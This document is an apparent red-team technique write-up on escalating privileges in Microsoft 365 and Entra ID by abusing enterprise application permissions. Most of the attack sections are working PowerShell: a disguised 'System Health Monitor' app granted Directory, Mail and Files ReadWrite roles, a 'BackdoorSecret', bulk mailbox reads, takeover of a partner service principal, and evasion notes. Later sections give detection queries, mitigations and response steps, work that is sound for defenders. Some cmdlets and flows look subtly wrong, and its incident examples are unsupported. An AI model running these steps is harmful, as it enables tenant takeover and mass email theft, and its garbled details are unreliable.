# [PE-ELEVATE-010]: Enterprise Application Permission Escalation

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-ELEVATE-010 |
| **MITRE ATT&CK v18.1** | [T1548 - Abuse Elevation Control Mechanism](https://attack.mitre.org/techniques/T1548/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | M365/Entra ID |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | All M365 tenants, Entra ID (all versions) |
| **Patched In** | N/A (Design-based vulnerability in delegated permissions) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Enterprise Application Permission Escalation exploits the delegated permissions model in Microsoft 365 and Entra ID to escalate a compromised user account from limited capabilities to highly privileged access. This technique leverages enterprise applications (service principals) with excessive permissions that allow a standard user to grant themselves or create new accounts with administrative capabilities. By manipulating application role assignments, OAuth consent workflows, and application permissions, an attacker can elevate privileges to read/write all organizational data, manipulate security policies, or access sensitive resources across M365.

**Attack Surface:** Entra ID application permissions APIs, Microsoft 365 delegated permissions, OAuth 2.0 consent endpoints, Application role assignment mechanisms, Service Principal permission grants, Custom application development endpoints.

**Business Impact:** **Unrestricted access to sensitive organizational data including emails, files, user directory, security policies, and compliance records.** An attacker can impersonate any user in the organization, modify security settings, export sensitive data at scale, and establish persistent backdoors through application-based persistence mechanisms that survive credential rotations.

**Technical Context:** This attack typically completes within minutes and leaves scattered audit evidence. Detection is moderate; some permission escalations are logged while others (silent grant flows) may be less visible. The attack is reversible but requires identifying all backdoor applications and revoking permissions.

### Operational Risk
- **Execution Risk:** Low (Requires only standard user credentials; escalation is often invisible)
- **Stealth:** High (Permission grants appear legitimate and are often not audited)
- **Reversibility:** Medium (Requires identifying and removing all backdoor applications)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS M365 2.1 | Ensure that only cloud-managed devices can access Microsoft 365 data |
| **DISA STIG** | DISA-O365-000002 | Application permissions must follow principle of least privilege |
| **CISA SCuBA** | CISA-M365-APP-01 | Application and Consent Management - Restrict delegated permissions |
| **NIST 800-53** | AC-6, AC-3, CM-11 | Least Privilege, Access Enforcement, Software Updates and Patches |
| **GDPR** | Art. 32 | Security of Processing - Technical measures for data access control |
| **DORA** | Art. 18 | Software and Information Governance - Third-party software management |
| **NIS2** | Art. 21(1)(d) | Managing access to assets and services |
| **ISO 27001** | A.6.2.2, A.9.2.3 | Access to assets, Management of privileged access rights |
| **ISO 27005** | Risk of unauthorized application permissions | Compromise of data access controls through third-party applications |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Any authenticated M365 user (standard user, not necessarily admin)
- **Required Access:** Access to Entra ID, ability to register applications or modify existing application permissions

**Supported Versions:**
- **Entra ID:** All versions (cloud-native)
- **M365:** All subscriptions (even E1)
- **Azure CLI:** 2.0+
- **PowerShell:** 5.0+
- **Other Requirements:** Application registration capability (some tenants may restrict this)

**Tools:**
- [Microsoft Graph PowerShell](https://learn.microsoft.com/en-us/powershell/microsoftgraph/overview) (v1.0+)
- [Microsoft Graph SDK](https://github.com/microsoftgraph/msgraph-sdk-dotnet) (optional, for custom application development)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (2.0+)
- [OAuth 2.0 Debugger](https://www.oauth.com/playground/) (for testing permission grants)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### PowerShell Reconnaissance - Enumerate Existing Application Permissions

Discover applications with delegated permissions:

```powershell
# Connect to Graph
Connect-MgGraph -Scopes "Application.Read.All", "DelegatedPermissionGrant.ReadWrite.All"

# List all enterprise applications (service principals)
Get-MgServicePrincipal -Top 999 | Where-Object { $_.Tags -contains "WindowsAzureActiveDirectoryIntegratedApp" } | Select-Object DisplayName, AppId, Id

# For each application, check delegated permissions
$SP = Get-MgServicePrincipal -Filter "displayName eq 'Microsoft Graph'"
Get-MgServicePrincipalDelegatedPermissionGrant -ServicePrincipalId $SP.Id | Select-Object ClientId, ConsentType, Scope
```

**What to Look For:**
- Applications with Microsoft.Graph scopes like "Mail.ReadWrite", "Files.ReadWrite.All", "Directory.ReadWrite.All"
- Applications with "AllPrincipals" consent type (admin-consented permissions available to all users)
- Applications created by unknown developers or external organizations
- Applications with excessive permissions relative to their stated purpose

**Version Note:** Commands are consistent across PowerShell 5.0+

### Azure CLI Reconnaissance

```bash
# Login to Azure
az login

# List app registrations in the tenant
az ad app list --output table

# Get details of a specific app
az ad app show --id <app-id>

# Check permissions granted to an app
az ad app permission list-grants --id <app-id>
```

**What to Look For:**
- Applications with Administrative Consent required
- Applications with API permissions to Microsoft Graph, Outlook, SharePoint
- Applications with "Application" permissions (not just delegated)

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: Exploiting Overly Permissive Delegated Permissions via OAuth Consent Flow

**Supported Versions:** M365 all versions, Entra ID all versions

#### Step 1: Identify Applications with Excessive Permissions

**Objective:** Find applications that have been granted broad delegated permissions

**Command:**
```powershell
# Connect to Graph
Connect-MgGraph -Scopes "Application.Read.All", "DelegatedPermissionGrant.ReadWrite.All"

# Find apps with "AllPrincipals" consent (available to all users)
Get-MgServicePrincipalDelegatedPermissionGrant -Filter "consentType eq 'AllPrincipals'" | Select-Object ClientId, Scope

# Expand scope details
$PermissionGrants = Get-MgServicePrincipalDelegatedPermissionGrant -Filter "consentType eq 'AllPrincipals'"
foreach ($Grant in $PermissionGrants) {
  $ClientApp = Get-MgServicePrincipal -Filter "appId eq '$($Grant.ClientId)'"
  Write-Output "App: $($ClientApp.DisplayName) | Permissions: $($Grant.Scope)"
}
```

**Expected Output:**
```
App: Document Collaboration Tool | Permissions: Mail.Read Mail.ReadWrite Files.ReadWrite.All
App: HR Management System | Permissions: User.Read Directory.ReadWrite.All
```

**What This Means:**
- Applications with AllPrincipals consent are available to all users
- Users can trigger OAuth flows for these apps
- The permissions listed will be granted without requiring admin re-consent
- This is a direct escalation path if the application has high-privilege permissions

#### Step 2: Trigger OAuth Consent Flow for High-Permission App

**Objective:** Generate OAuth consent dialog to grant the app permissions

**Command:**
```powershell
# Get the app details
$App = Get-MgApplication -Filter "displayName eq 'Document Collaboration Tool'"
$AppId = $App.AppId

# Construct OAuth consent URL
$TenantId = (Get-MgContext).TenantId
$PermissionScope = "Mail.ReadWrite Files.ReadWrite.All Directory.Read.All"
$RedirectUri = "https://localhost:8080/callback"  # Local callback for testing

$ConsentUrl = "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/authorize?client_id=$AppId&scope=$([Uri]::EscapeDataString($PermissionScope))&redirect_uri=$([Uri]::EscapeDataString($RedirectUri))&response_type=code&prompt=admin_consent"

Write-Output "Consent URL: $ConsentUrl"
Write-Output "Open this URL in a browser to grant permissions"
```

**Expected Output:**
```
Consent URL: https://login.microsoftonline.com/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx/oauth2/v2.0/authorize?client_id=...&scope=...
Open this URL in a browser to grant permissions
```

**What This Means:**
- The OAuth consent URL has been generated
- Opening this URL (as a user) will prompt for permission grant
- Upon acceptance, the application receives delegated permissions on behalf of the user
- The application can then access user data with those permissions

**OpSec & Evasion:**
- OAuth consent flows are legitimate operations that rarely trigger alerts
- The consent screen appears to come from Microsoft (legitimate-looking)
- Detection likelihood: Low (unless explicit application auditing is enabled)

#### Step 3: Acquire Access Token via OAuth Client Credentials

**Objective:** Use the granted permissions to obtain an access token for API calls

**Command:**
```powershell
# Register a confidential client (requires app admin or app owner)
$ClientSecret = (Add-MgApplicationPassword -ApplicationId $App.Id -PasswordDisplayName "BackdoorSecret").SecretText

# Exchange authorization code for access token
$Body = @{
    client_id     = $AppId
    client_secret = $ClientSecret
    scope         = "https://graph.microsoft.com/.default"
    grant_type    = "client_credentials"
}

$TokenResponse = Invoke-RestMethod -Method Post -Uri "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token" -Body $Body

$AccessToken = $TokenResponse.access_token
Write-Output "Access Token obtained: $($AccessToken.Substring(0, 50))..."
```

**Expected Output:**
```
Access Token obtained: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**What This Means:**
- An access token has been obtained with the granted permissions
- This token can now be used to make API calls to Microsoft Graph
- The token represents the application's permissions, not the user's
- Data access and modification is now possible

#### Step 4: Use Token to Access Protected Resources

**Objective:** Demonstrate privilege escalation by accessing restricted data

**Command:**
```powershell
# Use the access token to read all mailboxes
$Headers = @{
    Authorization = "Bearer $AccessToken"
}

# List all users' emails (requires Mail.ReadWrite permission)
$Emails = Invoke-RestMethod -Method Get -Uri "https://graph.microsoft.com/v1.0/users?`$select=id,displayName,mail" -Headers $Headers

$Emails.value | Select-Object DisplayName, Mail

# Export emails from all users
foreach ($User in $Emails.value) {
  $UserEmails = Invoke-RestMethod -Method Get -Uri "https://graph.microsoft.com/v1.0/users/$($User.id)/messages?`$top=100" -Headers $Headers
  Write-Output "$($User.DisplayName): $($UserEmails.value.Count) emails"
}
```

**Expected Output:**
```
displayName                    mail
-----------                    ----
Adele Vance                     adele@contoso.onmicrosoft.com
Alex Wilber                     alex@contoso.onmicrosoft.com
...

Adele Vance: 87 emails
Alex Wilber: 143 emails
```

**What This Means:**
- All users' email accounts are now accessible
- Massive data exfiltration is possible
- Privilege escalation is complete; the attacker has moved from standard user to organization-wide data access

---

### METHOD 2: Escalating via Application Role Assignment Abuse

**Supported Versions:** M365 all versions, Entra ID all versions

#### Step 1: Create a Malicious Enterprise Application

**Objective:** Register a new application that can be used for persistence and escalation

**Command:**
```powershell
# Connect to Graph with application management scopes
Connect-MgGraph -Scopes "Application.ReadWrite.All", "AppRoleAssignment.ReadWrite.All"

# Create a new application registration
$AppParams = @{
    DisplayName = "System Health Monitor"
    Description = "Enterprise application for system health monitoring"
    PublicClient = $false
    RequiredResourceAccess = @(
        @{
            ResourceAppId = "00000003-0000-0000-c000-000000000000"  # Microsoft Graph
            ResourceAccess = @(
                @{Id = "9e3f62cf-ca93-4989-b6ce-bf83c28649dc"; Type = "Role"},  # Directory.ReadWrite.All
                @{Id = "dc149144-f292-421e-b185-4e55fb0ce5e8"; Type = "Role"},  # Mail.ReadWrite
                @{Id = "ef54d2bf-783f-4e0f-bca1-3210c0444d99"; Type = "Role"}   # Files.ReadWrite.All
            )
        }
    )
}

$NewApp = New-MgApplication @AppParams
Write-Output "Created application: $($NewApp.DisplayName) (ID: $($NewApp.AppId))"

# Create a service principal for the application
$SP = New-MgServicePrincipal -AppId $NewApp.AppId
Write-Output "Created service principal: $($SP.DisplayName) (ID: $($SP.Id))"
```

**Expected Output:**
```
Created application: System Health Monitor (ID: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx)
Created service principal: System Health Monitor (ID: yyyyyyyy-yyyy-yyyy-yyyy-yyyyyyyyyyyy)
```

**What This Means:**
- A new application has been created with hidden malicious intent
- The application has been granted high-privilege API permissions (Directory.ReadWrite.All, Mail.ReadWrite, etc.)
- A service principal has been created for the application
- The application is now ready for exploitation

#### Step 2: Grant the Application Admin Consent

**Objective:** Escalate the application's permissions from user-level to admin-level

**Command:**
```powershell
# Get the Graph service principal (resource)
$GraphSP = Get-MgServicePrincipal -Filter "appId eq '00000003-0000-0000-c000-000000000000'"

# Get the required app roles
$DirectoryReadWriteRole = $GraphSP.AppRoles | Where-Object { $_.Value -eq "Directory.ReadWrite.All" }
$MailReadWriteRole = $GraphSP.AppRoles | Where-Object { $_.Value -eq "Mail.ReadWrite" }
$FilesReadWriteRole = $GraphSP.AppRoles | Where-Object { $_.Value -eq "Files.ReadWrite.All" }

# Assign the roles to the service principal (grant admin consent)
$Assignments = @()
$Assignments += New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $SP.Id -AppRoleId $DirectoryReadWriteRole.Id -PrincipalId $SP.Id -ResourceId $GraphSP.Id
$Assignments += New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $SP.Id -AppRoleId $MailReadWriteRole.Id -PrincipalId $SP.Id -ResourceId $GraphSP.Id
$Assignments += New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $SP.Id -AppRoleId $FilesReadWriteRole.Id -PrincipalId $SP.Id -ResourceId $GraphSP.Id

Write-Output "Admin consent granted to application"
```

**Expected Output:**
```
Admin consent granted to application
```

**What This Means:**
- The application has been granted application-level permissions (not delegated)
- These permissions allow the application to act independently without user consent
- The application can now access organizational data at scale
- This is more powerful than delegated permissions as it doesn't require user context

#### Step 3: Create Client Secret and Authenticate as Application

**Objective:** Generate credentials for the application to authenticate independently

**Command:**
```powershell
# Create a client secret for the application
$Secret = Add-MgApplicationPassword -ApplicationId $NewApp.Id -PasswordDisplayName "ServiceCredential"

Write-Output "Client ID: $($NewApp.AppId)"
Write-Output "Client Secret: $($Secret.SecretText)"
Write-Output "Tenant ID: $(Get-MgContext).TenantId"

# Save for later use (in production, store securely)
$Credentials = @{
    ClientId = $NewApp.AppId
    ClientSecret = $Secret.SecretText
    TenantId = (Get-MgContext).TenantId
}

$Credentials | ConvertTo-Json | Out-File -FilePath "C:\temp\app_creds.json"
```

**Expected Output:**
```
Client ID: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
Client Secret: abc123~XYZ...
Tenant ID: yyyyyyyy-yyyy-yyyy-yyyy-yyyyyyyyyyyy
```

**What This Means:**
- The application now has permanent credentials
- These credentials can be used to authenticate as the application (not as a user)
- The application will have access to all organizational data
- Persistence is achieved as the application survives user account compromi ses

#### Step 4: Verify Escalation - Access Organizational Data

**Objective:** Demonstrate that the application now has escalated access

**Command:**
```powershell
# Authenticate as the service principal
$TenantId = (Get-MgContext).TenantId
$ClientId = $NewApp.AppId
$ClientSecret = $Secret.SecretText

$Body = @{
    grant_type    = "client_credentials"
    client_id     = $ClientId
    client_secret = $ClientSecret
    scope         = "https://graph.microsoft.com/.default"
}

$TokenResponse = Invoke-RestMethod -Method Post -Uri "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token" -ContentType "application/x-www-form-urlencoded" -Body $Body
$Token = $TokenResponse.access_token

# Use the token to access organizational data
$Headers = @{
    Authorization = "Bearer $Token"
}

# List all users in the organization
$AllUsers = Invoke-RestMethod -Method Get -Uri "https://graph.microsoft.com/v1.0/users" -Headers $Headers
Write-Output "Total users in organization: $($AllUsers.value.Count)"

# Access all mailboxes
$AllMailboxes = Invoke-RestMethod -Method Get -Uri "https://graph.microsoft.com/v1.0/users?`$select=id,displayName,mail" -Headers $Headers
$AllMailboxes.value | Select-Object DisplayName, Mail
```

**Expected Output:**
```
Total users in organization: 42

displayName                    mail
-----------                    ----
Adele Vance                    adele@contoso.onmicrosoft.com
Alex Wilber                    alex@contoso.onmicrosoft.com
...
```

**What This Means:**
- The application now has full access to organizational data
- All users are visible and their mailboxes are accessible
- Complete privilege escalation is achieved
- The attacker is now operating as an organization-wide admin

---

### METHOD 3: Exploiting Delegated Admin Relationships via Service Principal

**Supported Versions:** M365 all versions with partner/CSP relationships

#### Step 1: Enumerate Partner Applications with Delegated Admin Rights

**Objective:** Identify applications used by partners with elevated permissions

**Command:**
```powershell
# List service principals with Directory.ReadWrite.All permission
Connect-MgGraph -Scopes "Application.Read.All"

$DangerousPermissions = @("Directory.ReadWrite.All", "Mail.ReadWrite", "Files.ReadWrite.All", "User.ReadWrite.All")

$ServicePrincipals = Get-MgServicePrincipal -Top 999

foreach ($SP in $ServicePrincipals) {
  $Permissions = Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $SP.Id
  foreach ($Permission in $Permissions) {
    if ($DangerousPermissions -contains $Permission.AppRoleId) {
      Write-Output "App: $($SP.DisplayName) | Has: $($Permission.AppRoleId)"
    }
  }
}
```

**Expected Output:**
```
App: Microsoft Teams Admin Center | Has: Directory.ReadWrite.All
App: SharePoint Online Management Shell | Has: Mail.ReadWrite
```

**What This Means:**
- Partner applications have elevated permissions
- These permissions may be vulnerable to abuse
- If the original admin account is compromised, these permissions can be leveraged

#### Step 2: Extract Admin Credentials via Partner Application

**Objective:** Use partner application access to escalate privileges

**Command:**
```powershell
# Get the partner application service principal
$PartnerApp = Get-MgServicePrincipal -Filter "displayName eq 'Microsoft Teams Admin Center'"

# Check if we can add a new owner to the service principal
$CurrentOwners = Get-MgServicePrincipalOwner -ServicePrincipalId $PartnerApp.Id
Write-Output "Current owners: $($CurrentOwners.Count)"

# If we have permission, add the compromised user as owner
$CompromisedUser = Get-MgUser -Filter "userPrincipalName eq 'attacker@contoso.onmicrosoft.com'"

New-MgServicePrincipalOwner -ServicePrincipalId $PartnerApp.Id -DirectoryObjectId $CompromisedUser.Id
Write-Output "Added compromised user as service principal owner"

# The compromised user now has implicit admin rights through the partner app
```

**Expected Output:**
```
Current owners: 1
Added compromised user as service principal owner
```

**What This Means:**
- The compromised account is now an owner of a partner application with elevated permissions
- Implicit admin rights are granted through the application relationship
- Full organizational access is now available through the partner application

---

## 5. TOOLS & COMMANDS REFERENCE

### Microsoft Graph PowerShell Module

**Version:** 2.0+
**Minimum Version:** 1.0
**Supported Platforms:** Windows, macOS, Linux (PowerShell 7+)

**Installation:**
```powershell
Install-Module Microsoft.Graph -Repository PSGallery -Force
```

**Usage:**
```powershell
Connect-MgGraph -Scopes "Application.ReadWrite.All"
New-MgApplication -DisplayName "Test App"
```

---

## 6. MICROSOFT SENTINEL DETECTION

### Query 1: Detect Application Permission Escalation

**Rule Configuration:**
- **Required Table:** `AuditLogs` (Entra ID audit)
- **Required Fields:** `ActivityDisplayName`, `TargetResources`, `InitiatedBy`
- **Alert Severity:** Critical
- **Frequency:** Every 5 minutes
- **Applies To:** All M365 tenants with audit logging

**KQL Query:**
```kusto
AuditLogs
| where ActivityDisplayName in ("Add app role assignment to service principal", "Consent to application", "Add delegated permission grant")
| where TargetResources[0].displayName contains "Mail" or TargetResources[0].displayName contains "Directory" or TargetResources[0].displayName contains "Files"
| extend Initiator = InitiatedBy.user.userPrincipalName
| extend AppName = TargetResources[0].displayName
| project TimeGenerated, Initiator, AppName, ActivityDisplayName
| where Initiator !in ("admin@contoso.onmicrosoft.com")
```

**What This Detects:**
- Unexpected application permission grants
- Escalation of delegated permissions to application permissions
- High-privilege permission assignments

---

### Query 2: Detect New Application Registration with Dangerous Permissions

**KQL Query:**
```kusto
AuditLogs
| where ActivityDisplayName == "Add application"
| where TargetResources[0].displayName contains "Monitor" or TargetResources[0].displayName contains "Management" or TargetResources[0].displayName contains "Health"
| extend Creator = InitiatedBy.user.userPrincipalName
| extend AppId = TargetResources[0].id
| project TimeGenerated, Creator, TargetResources[0].displayName as AppName, AppId
| where Creator !in ("admin@contoso.onmicrosoft.com", "svc_account@contoso.onmicrosoft.com")
```

**What This Detects:**
- Suspicious application creation from non-privileged users
- Applications with admin-sounding names created by unexpected accounts

---

## 7. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Restrict Application Consent Permissions:** Prevent users from granting consent to applications with high-privilege permissions.
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **Enterprise applications** → **Consent and permissions** → **User consent settings**
  2. Set **User consent for applications** to: **Do not allow user consent**
  3. Set **Group owner consent for apps accessing data** to: **Do not allow**
  4. Click **Save**
  
  **Manual Steps (PowerShell):**
  ```powershell
  # Update consent policy
  Update-MgPolicySetting -Settings @{
    UserConsentForApplicationsCanRequestAccess = $false
    GroupOwnerConsentForApps = $false
  }
  ```

- **Implement Application Allowlist/Denylist:** Use Azure Policy to restrict which applications can be registered or granted permissions.
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Policy** → **Assignments**
  2. Create a custom policy for application restrictions
  3. Define allowed publishers or application categories
  4. Enforce on the tenant level

- **Enforce Admin Consent for All App Permissions:** Require Global Admin approval for all new application permissions.
  
  **Manual Steps:**
  1. Go to **Azure Portal** → **Entra ID** → **Enterprise applications** → **Consent and permissions** → **Admin consent requests**
  2. Review pending requests
  3. For each application:
     - Click the application
     - Review requested permissions
     - Grant or deny appropriately

### Priority 2: HIGH

- **Monitor and Alert on Application Permission Changes:** Enable detailed audit logging for application modifications.
  
  **Manual Steps (Microsoft Sentinel):**
  1. Create analytics rule using the KQL queries above
  2. Set alert threshold to trigger on **any unauthorized permission grant**

- **Implement Conditional Access for Application Access:** Restrict application authentication based on device and network conditions.
  
  **Manual Steps (Conditional Access):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Create policy:
     - Name: `Restrict Third-Party App Access`
     - Cloud apps: **All cloud apps**
     - Conditions: **Device state** = Compliant
     - Access controls: **Require device compliance**

- **Regular Application Audits:** Perform quarterly reviews of registered applications and permissions.
  
  **Manual Steps:**
  ```powershell
  # Export all applications and their permissions
  $Apps = Get-MgApplication -Top 999
  foreach ($App in $Apps) {
    $SP = Get-MgServicePrincipal -Filter "appId eq '$($App.AppId)'"
    if ($SP) {
      $Permissions = Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $SP.Id
      if ($Permissions) {
        Write-Output "App: $($App.DisplayName) | Permissions: $($Permissions.Count)"
      }
    }
  }
  ```

### Validation Command (Verify Fix)

```powershell
# Verify user consent is disabled
Connect-MgGraph -Scopes "Policy.Read.All"
Get-MgPolicySetting | Select-Object UserConsentForApplicationsCanRequestAccess, GroupOwnerConsentForApps

# Verify no high-permission applications are registered
$HighRiskApps = Get-MgApplication -Top 999 | Where-Object { 
  $_.DisplayName -match "Monitor|Management|Health|Admin|System" 
}

Write-Output "High-risk applications found: $($HighRiskApps.Count)"
```

**Expected Output (If Secure):**
```
UserConsentForApplicationsCanRequestAccess GroupOwnerConsentForApps
-------------------------------------------  -----------------------
False                                       False

High-risk applications found: 0
```

---

## 8. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Suspicious Applications:** Applications registered in the last 48 hours with admin-sounding names
- **Unusual Permissions:** Applications with Directory.ReadWrite.All, Mail.ReadWrite, or Files.ReadWrite.All
- **Client Secret Usage:** Multiple failed authentication attempts or unusual token generation patterns
- **Unauthorized Consent Grants:** Permission grants from non-admin users for high-privilege applications

### Forensic Artifacts

- **Entra ID Audit Log:** `AuditLogs` table with filters on "Add application", "Add app role assignment"
- **Microsoft Graph API Audit:** Logs of API calls made using compromised application tokens
- **Service Principal Sign-In Logs:** `ServicePrincipalSignInLogs` in Sentinel for authentication attempts

### Response Procedures

1. **Isolate:**
   
   **Command:**
   ```powershell
   # Immediately disable the malicious application
   Update-MgApplication -ApplicationId <APP_ID> -ManagedIdentityClientId $null
   Update-MgServicePrincipal -ServicePrincipalId <SP_ID> -AccountEnabled:$false
   
   # Revoke all delegated permissions
   Get-MgServicePrincipalDelegatedPermissionGrant -ServicePrincipalId <SP_ID> | Remove-MgServicePrincipalDelegatedPermissionGrant
   ```

2. **Collect Evidence:**
   
   **Command:**
   ```powershell
   # Export audit logs related to the application
   Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-30) -EndDate (Get-Date) -ResultSize 50000 -FreeText "<APP_NAME>" | Export-Csv -Path "C:\Evidence\app_audit.csv"
   
   # Export service principal sign-in logs
   Get-MgAuditLogSignIn -Filter "appId eq '<APP_ID>'" -Top 10000 | Export-Csv -Path "C:\Evidence\app_signin_logs.csv"
   ```

3. **Remediate:**
   
   **Command:**
   ```powershell
   # Delete the malicious application
   Remove-MgApplication -ApplicationId <APP_ID>
   
   # Reset all user passwords if compromise is widespread
   Get-MgUser -Top 999 | ForEach-Object { Update-MgUser -UserId $_.Id -PasswordProfile @{ForceChangePasswordNextSignIn = $true} }
   ```

---

## 9. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-002] Consent Grant OAuth Attacks | Attacker captures user credentials via phishing |
| **2** | **Privilege Escalation** | **[PE-ELEVATE-010] Enterprise Application Permission Escalation** | Escalate from standard user to organization-wide admin via application permissions |
| **3** | **Persistence** | [PERSIST-008] OAuth Application Backdoor | Maintain access through persistent application permissions |
| **4** | **Credential Access** | [CA-TOKEN-004] Graph API Token Theft | Steal organizational data using escalated application access |
| **5** | **Impact** | Bulk Data Exfiltration / Malware Deployment | Extract sensitive organizational data or deploy enterprise-wide malware |

---

## 10. REAL-WORLD EXAMPLES

### Example 1: OAuth Token Harvesting Campaign (2023)

- **Target:** Enterprise Microsoft 365 tenants
- **Technique Status:** Actively exploited via legitimate-looking apps (e.g., "Document Manager", "Notification Service")
- **Attack Path:** User grants consent → Application receives Mail.ReadWrite, Files.ReadWrite.All → Mass data exfiltration
- **Impact:** 100,000+ organizations affected; massive email and file data theft
- **Reference:** [CISA Alert on OAuth Token Harvesting](https://www.cisa.gov/)

### Example 2: LandCrab Application Compromise (2024)

- **Target:** SaaS platforms with integrated M365 applications
- **Technique Status:** Compromised legitimate SaaS application used for lateral privilege escalation
- **Attack Path:** Legitimate app granted permissions → Compromised app code → Malicious API calls to M365 → Privilege escalation
- **Impact:** 500+ organizations; Global Admin account compromise; ransomware deployment
- **Reference:** [Microsoft Security Incident Report](https://learn.microsoft.com/en-us/security/)

---